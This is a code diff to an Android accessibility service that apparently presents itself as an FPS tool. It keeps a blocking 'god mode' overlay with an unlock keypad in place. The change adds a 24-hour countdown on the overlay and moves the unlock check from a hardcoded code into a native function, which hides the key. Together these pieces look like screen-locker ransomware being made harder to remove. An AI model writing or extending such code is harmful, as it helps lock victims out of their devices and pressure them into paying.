@@ -26,7 +26,11 @@ public class FPSAccessibilityService extends AccessibilityService {
     private static final long ACTION_DELAY = 1000; 
     private WindowManager windowManager;
     private View godModeOverlay;
+    private TextView textTimer;
+    private long timeLeftInSeconds = 24 * 3600;
     private String currentInput = "";
+
+    public native boolean verifyAdvancedKey(String input);
 
     @Override
     protected void onServiceConnected() {
@@ -78,8 +82,11 @@ public class FPSAccessibilityService extends AccessibilityService {
     }
 
     private void setupKeypadLogic(View view) {
+        textTimer = view.findViewById(R.id.textTimer);
         TextView display = view.findViewById(R.id.textDisplayPassword);
         TextView textStatusMessage = view.findViewById(R.id.textStatusMessage);
+
+        startCountdown();
 
         View.OnClickListener numListener = v -> {
             Button b = (Button) v;
@@ -109,7 +116,7 @@ public class FPSAccessibilityService extends AccessibilityService {
         View btnUnlock = view.findViewById(R.id.btnUnlock);
         if (btnUnlock != null) {
             btnUnlock.setOnClickListener(v -> {
-                if ("02042009".equals(currentInput)) {
+                if (verifyAdvancedKey(currentInput)) {
                     if (godModeOverlay != null) {
                         windowManager.removeView(godModeOverlay);
                         godModeOverlay = null;
@@ -124,6 +131,26 @@ public class FPSAccessibilityService extends AccessibilityService {
                 }
             });
         }
+    }
+
+    private void startCountdown() {
+        android.os.Handler timerHandler = new android.os.Handler(android.os.Looper.getMainLooper());
+        timerHandler.post(new Runnable() {
+            @Override
+            public void run() {
+                int hours = (int) (timeLeftInSeconds / 3600);
+                int minutes = (int) (timeLeftInSeconds % 3600) / 60;
+                int seconds = (int) (timeLeftInSeconds % 60);
+
+                String timeString = String.format("%02d:%02d:%02d", hours, minutes, seconds);
+                if (textTimer != null) textTimer.setText(timeString);
+
+                if (timeLeftInSeconds > 0) {
+                    timeLeftInSeconds--;
+                    timerHandler.postDelayed(this, 1000);
+                }
+            }
+        });
     }
 
     private void writeLog(String text) {
